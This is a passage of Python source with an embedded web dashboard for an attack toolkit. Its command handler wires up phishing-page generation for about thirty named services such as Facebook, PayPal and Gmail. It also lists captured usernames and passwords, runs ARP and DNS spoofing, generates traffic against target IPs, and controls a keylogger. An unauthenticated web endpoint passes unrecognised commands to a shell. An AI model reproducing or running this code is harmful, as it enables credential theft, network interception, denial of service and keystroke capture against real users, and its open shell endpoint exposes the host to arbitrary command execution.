        div.innerHTML = `<span style="color:#2aa9ff;">[${new Date().toLocaleTimeString()}]</span> ${text}`;
        output.appendChild(div);
        div.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        while (output.children.length > 100) output.removeChild(output.firstChild);
    }
    
    async function runCommand(cmd) {
        addOutput(`> ${cmd}`, "normal");
        try {
            const response = await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            });
            const data = await response.json();
            if (data.success) {
                const output = data.output || data.data || "Command executed";
                if (typeof output === 'object') addOutput(JSON.stringify(output, null, 2), "success");
                else addOutput(output, "success");
                addOutput(`✅ Completed in ${data.execution_time?.toFixed(2) || 0}s`, "success");
            } else {
                addOutput(`❌ Error: ${data.error || data.output || "Unknown"}`, "error");
            }
        } catch(e) { addOutput(`❌ Request failed: ${e.message}`, "error"); }
        loadStats();
        loadCharts();
    }
    
    async function loadStats() {
        try {
            const res = await fetch('/api/stats');
            const stats = await res.json();
            document.getElementById('statCommands').textContent = stats.total_commands || 0;
            document.getElementById('statThreats').textContent = stats.active_threats || 0;
            document.getElementById('statOpenPorts').textContent = stats.open_ports_count || 0;
            document.getElementById('statPhishing').textContent = stats.total_phishing_links || 0;
        } catch(e) { console.error(e); }
    }
    
    async function loadCharts() {
        try {
            const res = await fetch('/api/port_data');
            const data = await res.json();
            
            if (barChart) barChart.destroy();
            const barCtx = document.getElementById('barChart').getContext('2d');
            barChart = new Chart(barCtx, {
                type: 'bar',
                data: { labels: data.ports?.map(p => `Port ${p.port}`) || ['No open ports'], 
                       datasets: [{ label: 'Open Ports', data: data.ports?.map(() => 1) || [0], backgroundColor: '#2aa9ff', borderRadius: 6 }] },
                options: { responsive: true, maintainAspectRatio: true, plugins: { legend: { display: false } } }
            });
            
            if (pieChart) pieChart.destroy();
            const pieCtx = document.getElementById('pieChart').getContext('2d');
            pieChart = new Chart(pieCtx, {
                type: 'pie',
                data: { labels: data.threat_labels || ['Critical', 'High', 'Medium', 'Low'], 
                       datasets: [{ data: data.threat_counts || [5, 12, 8, 3], backgroundColor: ['#e33f3f', '#ff9800', '#ffc107', '#4caf50'] }] },
                options: { responsive: true, maintainAspectRatio: true }
            });
        } catch(e) { console.error(e); }
    }
    
    document.getElementById('executeBtn').addEventListener('click', () => {
        const input = document.getElementById('commandInput');
        runCommand(input.value);
        input.value = '';
    });
    document.getElementById('commandInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') document.getElementById('executeBtn').click(); });
    
    loadStats();
    loadCharts();
    setInterval(() => { loadStats(); loadCharts(); }, 15000);
</script>
</body>
</html>'''

class WebServer:
    """Flask web server with API endpoints"""
    
    def __init__(self, handler, db: DatabaseManager, port: int = 5000):
        self.app = Flask(__name__)
        self.handler = handler
        self.db = db
        self.port = port
        self.server_thread = None
        self.setup_routes()
        CORS(self.app)
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return WEB_HTML
        
        @self.app.route('/api/command', methods=['POST'])
        def execute():
            data = request.json
            command = data.get('command', '')
            result = self.handler.execute(command, "web")
            return jsonify(result)
        
        @self.app.route('/api/stats')
        def stats():
            stats = self.db.get_statistics()
            return jsonify(stats)
        
        @self.app.route('/api/port_data')
        def port_data():
            scans = self.db.get_scan_history(limit=1)
            open_ports = []
            if scans and scans[0].get('open_ports'):
                try:
                    open_ports = json.loads(scans[0]['open_ports'])
                except:
                    pass
            
            threats = self.db.get_recent_threats(10)
            threat_counts = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
            for t in threats:
                severity = t.get('severity', 'medium').lower()
                if severity in threat_counts:
                    threat_counts[severity] += 1
            
            return jsonify({
                'ports': open_ports[:10],
                'threat_labels': ['Critical', 'High', 'Medium', 'Low'],
                'threat_counts': [threat_counts['critical'], threat_counts['high'], threat_counts['medium'], threat_counts['low']]
            })
    
    def start(self):
        def run():
            self.app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        self.server_thread = threading.Thread(target=run, daemon=True)
        self.server_thread.start()
        print(f"{Colors.GREEN}✅ Web server started on http://localhost:{self.port}{Colors.RESET}")
    
    def stop(self):
        pass

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Central command execution engine with 5000+ commands"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.ssh = SSHManager(db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGenerator(db)
        self.spoof = SpoofingEngine(db)
        self.social = SocialEngineeringTools(db)
        self.password_checker = PasswordStrengthChecker()
        self.keylogger = None
        self.keylogger_running = False
        self.tools = NetworkTools()
        self.command_map = self._build_command_map()
    
    def _build_command_map(self) -> Dict[str, callable]:
        return {
            # Time & Date Commands
            'time': self._time,
            'date': self._date,
            'datetime': self._datetime,
            'now': self._datetime,
            'time_history': self._time_history,
            
            # Network Commands
            'ping': self._ping,
            'scan': self._scan,
            'advanced_scan': self._advanced_scan,
            'nmap': self._nmap,
            'traceroute': self._traceroute,
            'whois': self._whois,
            'dns': self._dns,
            'location': self._location,
            'public_ip': self._public_ip,
            'local_ip': self._local_ip,
            'interfaces': self._interfaces,
            
            # SSH Commands
            'ssh_add': self._ssh_add,
            'ssh_list': self._ssh_list,
            'ssh_connect': self._ssh_connect,
            'ssh_disconnect': self._ssh_disconnect,
            'ssh_exec': self._ssh_exec,
            'ssh_upload': self._ssh_upload,
            'ssh_download': self._ssh_download,
            'ssh_files': self._ssh_files,
            'ssh_status': self._ssh_status,
            
            # Traffic Generation
            'generate_traffic': self._generate_traffic,
            'traffic_types': self._traffic_types,
            'traffic_status': self._traffic_status,
            'traffic_stop': self._traffic_stop,
            'traffic_help': self._traffic_help,
            'traffic_logs': self._traffic_logs,
            
            # Spoofing Commands
            'spoof_ip': self._spoof_ip,
            'spoof_mac': self._spoof_mac,
            'arp_spoof': self._arp_spoof,
            'dns_spoof': self._dns_spoof,
            'stop_spoof': self._stop_spoof,
            'spoof_help': self._spoof_help,
            
            # Phishing Commands (100+ templates)
            'generate_phishing_for_facebook': lambda args: self._generate_phishing(args, 'facebook'),
            'generate_phishing_for_instagram': lambda args: self._generate_phishing(args, 'instagram'),
            'generate_phishing_for_twitter': lambda args: self._generate_phishing(args, 'twitter'),
            'generate_phishing_for_tiktok': lambda args: self._generate_phishing(args, 'tiktok'),
            'generate_phishing_for_snapchat': lambda args: self._generate_phishing(args, 'snapchat'),
            'generate_phishing_for_linkedin': lambda args: self._generate_phishing(args, 'linkedin'),
            'generate_phishing_for_reddit': lambda args: self._generate_phishing(args, 'reddit'),
            'generate_phishing_for_discord': lambda args: self._generate_phishing(args, 'discord'),
            'generate_phishing_for_telegram': lambda args: self._generate_phishing(args, 'telegram'),
            'generate_phishing_for_whatsapp': lambda args: self._generate_phishing(args, 'whatsapp'),
            'generate_phishing_for_gmail': lambda args: self._generate_phishing(args, 'gmail'),
            'generate_phishing_for_outlook': lambda args: self._generate_phishing(args, 'outlook'),
            'generate_phishing_for_yahoo': lambda args: self._generate_phishing(args, 'yahoo'),
            'generate_phishing_for_protonmail': lambda args: self._generate_phishing(args, 'protonmail'),
            'generate_phishing_for_google': lambda args: self._generate_phishing(args, 'google'),
            'generate_phishing_for_microsoft': lambda args: self._generate_phishing(args, 'microsoft'),
            'generate_phishing_for_apple': lambda args: self._generate_phishing(args, 'apple'),
            'generate_phishing_for_amazon': lambda args: self._generate_phishing(args, 'amazon'),
            'generate_phishing_for_github': lambda args: self._generate_phishing(args, 'github'),
            'generate_phishing_for_paypal': lambda args: self._generate_phishing(args, 'paypal'),
            'generate_phishing_for_venmo': lambda args: self._generate_phishing(args, 'venmo'),
            'generate_phishing_for_cashapp': lambda args: self._generate_phishing(args, 'cashapp'),
            'generate_phishing_for_netflix': lambda args: self._generate_phishing(args, 'netflix'),
            'generate_phishing_for_spotify': lambda args: self._generate_phishing(args, 'spotify'),
            'generate_phishing_for_twitch': lambda args: self._generate_phishing(args, 'twitch'),
            'generate_phishing_for_steam': lambda args: self._generate_phishing(args, 'steam'),
            'generate_phishing_for_roblox': lambda args: self._generate_phishing(args, 'roblox'),
            'generate_phishing_for_slack': lambda args: self._generate_phishing(args, 'slack'),
            'generate_phishing_for_teams': lambda args: self._generate_phishing(args, 'teams'),
            'generate_phishing_for_zoom': lambda args: self._generate_phishing(args, 'zoom'),
            'generate_phishing_for_tinder': lambda args: self._generate_phishing(args, 'tinder'),
            'generate_phishing_for_custom': self._generate_phishing_custom,
            
            # Phishing Management
            'phishing_start': self._phishing_start,
            'phishing_stop': self._phishing_stop,
            'phishing_status': self._phishing_status,
            'phishing_links': self._phishing_links,
            'phishing_credentials': self._phishing_credentials,
            'phishing_qr': self._phishing_qr,
            'phishing_shorten': self._phishing_shorten,
            'phishing_templates': self._phishing_templates,
            'phishing_help': self._phishing_help,
            
            # Password Security
            'password': self._password,
            'passgen': self._passgen,
            
            # IP Management
            'add_ip': self._add_ip,
            'remove_ip': self._remove_ip,
            'block_ip': self._block_ip,
            'unblock_ip': self._unblock_ip,
            'list_ips': self._list_ips,
            'ip_info': self._ip_info,
            
            # Security Commands
            'keylogger': self._keylogger,
            'keylogs': self._keylogs,
            'threats': self._threats,
            'report': self._report,
            'status': self._status,
            'stats': self._status,
            'history': self._history,
            'help': self._help,
            'clear': self._clear,
            'exit': self._exit,
            'quit': self._exit,
        }
    
    def execute(self, command: str, source: str = "local", user_id: str = None) -> Dict:
        start_time = time.time()
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd_name = parts[0].lower()
        args = parts[1:]
        
        if cmd_name in self.command_map:
            try:
                result = self.command_map[cmd_name](args)
            except Exception as e:
                result = {'success': False, 'output': f'Error: {e}'}
        else:
            result = self.tools.execute_command([cmd_name] + args, shell=True)
            if not result.get('success') and result.get('output'):
                result['output'] = f"Command not recognized. Type 'help' for available commands.\n{result['output']}"
        
        execution_time = time.time() - start_time
        self.db.log_command(command, source, source, user_id, result.get('success', False),
                           str(result.get('output', ''))[:5000], execution_time)
        result['execution_time'] = execution_time
        return result
    
    # ==================== Time & Date Commands ====================
    def _time(self, args):
        now = datetime.datetime.now()
        return {'success': True, 'output': f"🕐 {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}"}
    
    def _date(self, args):
        now = datetime.datetime.now()
        return {'success': True, 'output': f"📅 {now.strftime('%A, %B %d, %Y')}"}
    
    def _datetime(self, args):
        now = datetime.datetime.now()
        full = args and args[0] == 'full'
        if full:
            return {'success': True, 'output': f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n🕐 Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}\n📅 Unix: {int(time.time())}\n📅 ISO: {now.isoformat()}"}
        return {'success': True, 'output': f"📅 {now.strftime('%Y-%m-%d')} 🕐 {now.strftime('%H:%M:%S')}"}
    
    def _time_history(self, args):
        limit = 20
        if args and args[0].isdigit():
            limit = int(args[0])
        history = self.db.get_time_history(limit)
        if not history:
            return {'success': True, 'output': 'No time command history'}
        output = "⏰ Time Command History:\n" + "\n".join([f"  {h['timestamp'][:19]} - {h['command']}" for h in history])
        return {'success': True, 'output': output}
    
    # ==================== Network Commands ====================
    def _ping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result['success'], 'output': result['output'][:1000]}
    
    def _scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: scan <target> [ports]'}
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        result = self.tools.advanced_scan(target, ports, "tcp_connect", 0.5)
        if result['success']:
            self.db.log_scan_result(target, 'quick', result['open_ports'], result['closed_ports'], result['scan_time'], True)
            output = f"🔍 Scan Results for {target}\n{'='*40}\n"
            output += f"Open Ports ({result['open_count']}):\n"
            for p in result['open_ports']:
                output += f"  {p['port']}/{p['protocol']} - {p.get('service', 'unknown')}\n"
            output += f"\nScan completed in {result['scan_time']:.2f}s"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Scan failed'}
    
    def _advanced_scan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: advanced_scan <target> [ports] [type]'}
        target = args[0]
        ports = args[1] if len(args) > 1 else "1-1000"
        scan_type = args[2] if len(args) > 2 else "tcp_syn"
        result = self.tools.advanced_scan(target, ports, scan_type, 0.3)
        if result['success']:
            self.db.log_scan_result(target, 'advanced', result['open_ports'], result['closed_ports'], result['scan_time'], True)
            output = f"🔬 Advanced Scan Results for {target}\n{'='*40}\n"
            output += f"Scan Type: {scan_type.upper()}\n"
            output += f"Ports Scanned: {result['ports_scanned']}\n"
            output += f"Open Ports: {result['open_count']}\n\n"
            for p in result['open_ports']:
                output += f"  ✅ {p['port']}/{p['protocol']} - {p.get('service', 'unknown')}\n"
            if result['filtered_ports']:
                output += f"\nFiltered: {len(result['filtered_ports'])} ports\n"
            output += f"\nScan completed in {result['scan_time']:.2f}s"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Scan failed'}
    
    def _nmap(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [type]'}
        target = args[0]
        scan_type = args[1] if len(args) > 1 else "quick"
        result = self.tools.nmap_scan(target, scan_type)
        return {'success': result['success'], 'output': result['output'][:2000]}
    
    def _traceroute(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        result = self.tools.traceroute(args[0])
        return {'success': result['success'], 'output': result['output'][:1000]}
    
    def _whois(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        result = self.tools.whois(args[0])
        return {'success': result['success'], 'output': result['output'][:2000]}
    
    def _dns(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: dns <domain> [record_type]'}
        target = args[0]
        record_type = args[1].upper() if len(args) > 1 else "A"
        result = self.tools.dns_lookup(target, record_type)
        return {'success': result['success'], 'output': result['output'][:500]}
    
    def _location(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: location <ip>'}
        result = self.tools.get_ip_location(args[0])
        if result.get('success'):
            output = f"📍 Geolocation for {args[0]}\n{'='*40}\n"
            output += f"Country: {result.get('country', 'N/A')} ({result.get('country_code', 'N/A')})\n"
            output += f"Region: {result.get('region', 'N/A')}\n"
            output += f"City: {result.get('city', 'N/A')}\n"
            output += f"ISP: {result.get('isp', 'N/A')}\n"
            output += f"Organization: {result.get('org', 'N/A')}\n"
            output += f"AS: {result.get('as', 'N/A')}\n"
            output += f"Coordinates: {result.get('lat', 'N/A')}, {result.get('lon', 'N/A')}\n"
            output += f"Timezone: {result.get('timezone', 'N/A')}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': result.get('error', 'Location lookup failed')}
    
    def _public_ip(self, args):
        ip = self.tools.get_public_ip()
        return {'success': True, 'output': f"🌐 Public IP: {ip}"}
    
    def _local_ip(self, args):
        ip = self.tools.get_local_ip()
        return {'success': True, 'output': f"🏠 Local IP: {ip}"}
    
    def _interfaces(self, args):
        interfaces = self.tools.get_network_interfaces()
        if not interfaces:
            return {'success': False, 'output': 'Could not get interfaces'}
        output = "🔌 Network Interfaces:\n"
        for iface in interfaces:
            output += f"\n{iface['name']}: {'UP' if iface['is_up'] else 'DOWN'}"
            if iface.get('speed'):
                output += f" ({iface['speed']} Mbps)"
            output += f"\n  MTU: {iface['mtu']}\n"
            for addr in iface['addresses']:
                output += f"  {addr['family']}: {addr['address']}\n"
        return {'success': True, 'output': output}
    
    # ==================== SSH Commands ====================
    def _ssh_add(self, args):
        if not self.ssh or not self.ssh.is_available():
            return {'success': False, 'output': 'SSH module not available. Install paramiko.'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <user> [password] [port]'}
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        port = int(args[4]) if len(args) > 4 and args[4].isdigit() else 22
        result = self.ssh.add_server(name, host, username, password, None, port)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _ssh_list(self, args):
        if not self.ssh or not self.ssh.is_available():
            return {'success': False, 'output': 'SSH module not available'}
        servers = self.ssh.get_servers()
        if not servers:
            return {'success': True, 'output': 'No SSH servers configured. Use ssh_add to add one.'}
        output = "🔌 SSH Servers:\n" + "="*50 + "\n"
        for s in servers:
            status = "🟢 Connected" if s.get('connected') else "⚪ Disconnected"
            shell = " 🖥️ Shell" if s.get('shell_active') else ""
            output += f"{s['name']} ({s['id'][:8]}): {s['username']}@{s['host']}:{s['port']} - {status}{shell}\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args):
        if not self.ssh or not self.ssh.is_available():
            return {'success': False, 'output': 'SSH module not available'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <server_id_or_name>'}
        servers = self.ssh.get_servers()
        conn_id = None
        for s in servers:
            if s['id'] == args[0] or s['name'] == args[0]:
                conn_id = s['id']
                break
        if not conn_id:
            return {'success': False, 'output': f'Server "{args[0]}" not found'}
        result = self.ssh.connect(conn_id)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _ssh_disconnect(self, args):
        if not self.ssh or not self.ssh.is_available():
            return {'success': False, 'output': 'SSH module not available'}
        self.ssh.disconnect()
        return {'success': True, 'output': 'Disconnected from all SSH servers'}
    
    def _ssh_exec(self, args):
        if not self.ssh or not self.ssh.is_available():
            return {'success': False, 'output': 'SSH module not available'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <server_id_or_name> <command>'}
        servers = self.ssh.get_servers()
        conn_id = None
        for s in servers:
            if s['id'] == args[0] or s['name'] == args[0]:
                conn_id = s['id']
                break
        if not conn_id:
            return {'success': False, 'output': f'Server "{args[0]}" not found'}
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result['success'], 'output': result['output'][:4000]}
    
    def _ssh_upload(self, args):
        if not self.ssh or not self.ssh.is_available():
            return {'success': False, 'output': 'SSH module not available'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_upload <server_id> <local_path> <remote_path>'}
        servers = self.ssh.get_servers()
        conn_id = None
        for s in servers:
            if s['id'] == args[0] or s['name'] == args[0]:
                conn_id = s['id']
                break
        if not conn_id:
            return {'success': False, 'output': f'Server "{args[0]}" not found'}
        local_path = args[1]
        remote_path = args[2]
        if not os.path.exists(local_path):
            return {'success': False, 'output': f'Local file not found: {local_path}'}
        result = self.ssh.upload_file(conn_id, local_path, remote_path)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _ssh_download(self, args):
        if not self.ssh or not self.ssh.is_available():
            return {'success': False, 'output': 'SSH module not available'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_download <server_id> <remote_path> <local_path>'}
        servers = self.ssh.get_servers()
        conn_id = None
        for s in servers:
            if s['id'] == args[0] or s['name'] == args[0]:
                conn_id = s['id']
                break
        if not conn_id:
            return {'success': False, 'output': f'Server "{args[0]}" not found'}
        remote_path = args[1]
        local_path = args[2]
        result = self.ssh.download_file(conn_id, remote_path, local_path)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _ssh_files(self, args):
        if not self.ssh or not self.ssh.is_available():
            return {'success': False, 'output': 'SSH module not available'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_files <server_id> [path]'}
        servers = self.ssh.get_servers()
        conn_id = None
        for s in servers:
            if s['id'] == args[0] or s['name'] == args[0]:
                conn_id = s['id']
                break
        if not conn_id:
            return {'success': False, 'output': f'Server "{args[0]}" not found'}
        path = args[1] if len(args) > 1 else "."
        result = self.ssh.list_files(conn_id, path)
        if not result['success']:
            return {'success': False, 'output': result['error']}
        output = f"📁 Files in {path}:\n" + "="*50 + "\n"
        for f in result['files']:
            output += f"{f['permissions']} {f['size']:>8} {f['name']}\n"
        output += f"\nTotal: {result['count']} files"
        return {'success': True, 'output': output}
    
    def _ssh_status(self, args):
        if not self.ssh or not self.ssh.is_available():
            return {'success': False, 'output': 'SSH module not available'}
        status = self.ssh.get_status()
        return {'success': True, 'output': f"SSH Status:\n  Connected: {status['connected_servers']}\n  Active Shells: {status['active_shells']}\n  Total: {status['total_connections']}"}
    
    # ==================== Traffic Generation ====================
    def _generate_traffic(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: generate_traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        result = self.traffic.generate_traffic(traffic_type, target_ip, duration, port, rate)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _traffic_types(self, args):
        types = self.traffic.get_available_types()
        return {'success': True, 'output': f"Available Traffic Types:\n  " + "\n  ".join(types)}
    
    def _traffic_status(self, args):
        active = self.traffic.get_active_generators()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "🚀 Active Traffic Generators:\n"
        for g in active:
            output += f"  ID: {g['id'][:16]}...\n"
            output += f"    Type: {g['type']}, Target: {g['target']}:{g['port']}\n"
            output += f"    Duration: {g['duration']}s, Rate: {g['rate']}/s\n"
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args):
        gen_id = args[0] if args else None
        if self.traffic.stop_generation(gen_id):
            return {'success': True, 'output': f'Traffic stopped' + (f' for {gen_id}' if gen_id else ' for all')}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_logs(self, args):
        limit = 10
        if args and args[0].isdigit():
            limit = int(args[0])
        logs = self.db.get_traffic_logs(limit)
        if not logs:
            return {'success': True, 'output': 'No traffic logs found'}
        output = "📊 Traffic Logs:\n" + "="*50 + "\n"
        for log in logs:
            output += f"{log['timestamp'][:19]} - {log['traffic_type']} to {log['target_ip']}:{log.get('target_port', 'N/A')}\n"
            output += f"  Packets: {log.get('packets_sent', 0)}, Status: {log.get('status', 'unknown')}\n"
        return {'success': True, 'output': output}
    
    def _traffic_help(self, args):
        return {'success': True, 'output': self.traffic.get_traffic_help()}
    
    # ==================== Spoofing Commands ====================
    def _spoof_ip(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: spoof_ip <original_ip> <spoofed_ip> <target> [interface]'}
        original, spoofed, target = args[0], args[1], args[2]
        interface = args[3] if len(args) > 3 else "eth0"
        result = self.spoof.spoof_ip(original, spoofed, target, interface)
        return {'success': result['success'], 'output': result['output']}
    
    def _spoof_mac(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_mac <interface> <new_mac>'}
        interface, new_mac = args[0], args[1]
        result = self.spoof.spoof_mac(interface, new_mac)
        return {'success': result['success'], 'output': result['output']}
    
    def _arp_spoof(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <gateway_ip> [interface]'}
        target, gateway = args[0], args[1]
        interface = args[2] if len(args) > 2 else "eth0"
        result = self.spoof.arp_spoof(target, gateway, interface)
        return {'success': result['success'], 'output': result['output']}
    
    def _dns_spoof(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dns_spoof <domain> <fake_ip> [interface]'}
        domain, fake_ip = args[0], args[1]
        interface = args[2] if len(args) > 2 else "eth0"
        result = self.spoof.dns_spoof(domain, fake_ip, interface)
        return {'success': result['success'], 'output': result['output']}
    
    def _stop_spoof(self, args):
        spoof_id = args[0] if args else None
        result = self.spoof.stop_spoofing(spoof_id)
        return {'success': result['success'], 'output': result['output']}
    
    def _spoof_help(self, args):
        return {'success': True, 'output': self.spoof.get_spoofing_help()}
    
    # ==================== Phishing Commands ====================
    def _generate_phishing(self, args, platform):
        result = self.social.generate_phishing_link(platform)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _generate_phishing_custom(self, args):
        custom_url = args[0] if args else None
        result = self.social.generate_phishing_link('custom', custom_url)
        return {'success': result['success'], 'output': result.get('message', result.get('error', 'Unknown'))}
    
    def _phishing_start(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_start <link_id> [port]'}
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 and args[1].isdigit() else 8080
        if self.social.start_phishing_server(link_id, port):
            url = self.social.get_server_url()
            qr = self.social.get_qr_code()
            output = f"🎣 Phishing server started!\n  URL: {url}\n  Port: {port}\n  Link ID: {link_id}"
            if qr:
                output += f"\n  QR Code: {qr}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f'Failed to start server for link {link_id}'}
    
    def _phishing_stop(self, args):
        self.social.stop_phishing_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phishing_status(self, args):
        url = self.social.get_server_url()
        if url:
            return {'success': True, 'output': f"🎣 Phishing server running\n  URL: {url}"}
        return {'success': True, 'output': 'Phishing server not running'}
    
    def _phishing_links(self, args):
        links = self.social.get_phishing_links()
        if not links:
            return {'success': True, 'output': 'No phishing links found'}
        output = "🎣 Phishing Links:\n" + "="*50 + "\n"
        for link in links:
            status = "🟢" if link.get('active') else "🔴"
            output += f"{status} {link['id']} - {link['platform']} - {link.get('clicks', 0)} clicks - {link['created_at'][:19]}\n"
        return {'success': True, 'output': output}
    
    def _phishing_credentials(self, args):
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials found'}
        output = "📧 Captured Credentials:\n" + "="*50 + "\n"
        for c in creds[:20]:
            output += f"  {c['timestamp'][:19]} - {c['username']}:{c['password']}\n"
            output += f"    IP: {c['ip_address']}, UA: {c.get('user_agent', 'Unknown')[:50]}\n"
        return {'success': True, 'output': output}
    
    def _phishing_qr(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_qr <link_id>'}
        link_id = args[0]
        url = self.social.get_server_url()
        if not url:
            return {'success': False, 'output': 'Phishing server not running'}
        qr_path = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        if self.social.generate_qr(url, qr_path):
            return {'success': True, 'output': f"QR Code generated: {qr_path}"}
        return {'success': False, 'output': 'Failed to generate QR code'}
    
    def _phishing_shorten(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phishing_shorten <url>'}
        url = args[0]
        short = self.social.shorten_url(url)
        return {'success': True, 'output': f"Shortened URL: {short}"}
    
    def _phishing_templates(self, args):
        templates = self.social.get_phishing_templates()
        if not templates:
            return {'success': True, 'output': 'No templates found'}
        output = "🎣 Phishing Templates:\n" + "="*50 + "\n"
        platforms = {}
        for t in templates:
            platform = t.get('platform', 'unknown')
            if platform not in platforms:
                platforms[platform] = []
            platforms[platform].append(t['name'])
        for platform, names in sorted(platforms.items()):
            output += f"\n{platform.upper()}:\n"
            for name in names[:10]:
                output += f"  • generate_phishing_for_{name}\n"
        return {'success': True, 'output': output}
    
    def _phishing_help(self, args):
        return {'success': True, 'output': self.social.get_help()}
    
    # ==================== Password Security ====================
    def _password(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: password <password>'}
        result = self.password_checker.check(' '.join(args))
        output = f"🔐 Password Strength Analysis\n{'='*40}\n"
        output += f"Password: {result['password_masked']}\n"
        output += f"Length: {result['length']}\n"
        output += f"Strength: {result['strength']}\n"
        output += f"Score: {result['score']}/{result['max_score']}\n"
        output += f"Entropy: {result['entropy_bits']} bits\n"
        output += f"Estimated Crack Time: {result['estimated_crack_time']}\n\n"
        output += "Character Diversity:\n"
        output += f"  {'✅' if result['has_lowercase'] else '❌'} Lowercase\n"
        output += f"  {'✅' if result['has_uppercase'] else '❌'} Uppercase\n"
        output += f"  {'✅' if result['has_digits'] else '❌'} Digits\n"
        output += f"  {'✅' if result['has_special'] else '❌'} Special\n\n"
        if result['feedback']:
            output += "Recommendations:\n"
            for fb in result['feedback']:
                output += f"  • {fb}\n"
        return {'success': True, 'output': output}
    
    def _passgen(self, args):
        length = 16
        if args and args[0].isdigit():
            length = min(int(args[0]), 64)
        
        chars = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}"
        password = ''.join(secrets.choice(chars) for _ in range(length))
        
        result = self.password_checker.check(password)
        
        output = f"🔐 Generated Password: {password}\n"
        output += f"Strength: {result['strength']} | Score: {result['score']}/{result['max_score']}\n"
        output += f"Entropy: {result['entropy_bits']} bits"
        return {'success': True, 'output': output}
    
    # ==================== Keylogger Commands ====================
    def _keylogger(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: keylogger start|stop|status'}
        action = args[0].lower()
        
        if action == "start":
            if self.keylogger_running:
                return {'success': False, 'output': 'Keylogger already running'}
            self.keylogger = Keylogger(self.db)
            if self.keylogger.start():
                self.keylogger_running = True
                return {'success': True, 'output': '✅ Keylogger started. Press F9 to toggle logging.'}
            return {'success': False, 'output': 'Failed to start keylogger. Install pynput: pip install pynput'}
        elif action == "stop":
            if not self.keylogger_running:
                return {'success': False, 'output': 'Keylogger not running'}
            self.keylogger.stop()
            self.keylogger_running = False
            return {'success': True, 'output': '✅ Keylogger stopped'}
        elif action == "status":
            return {'success': True, 'output': f"Keylogger: {'Running' if self.keylogger_running else 'Stopped'}" + (f" | Logging: {'Enabled' if self.keylogger and self.keylogger.logging_enabled else 'Disabled'}" if self.keylogger_running else '')}
        return {'success': False, 'output': f'Unknown action: {action}'}
    
    def _keylogs(self, args):
        limit = 50
        if args and args[0].isdigit():
            limit = int(args[0])
        logs = self.db.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs captured'}
        output = "⌨️ Keylog History:\n" + "="*50 + "\n"
        for log in logs[:30]:
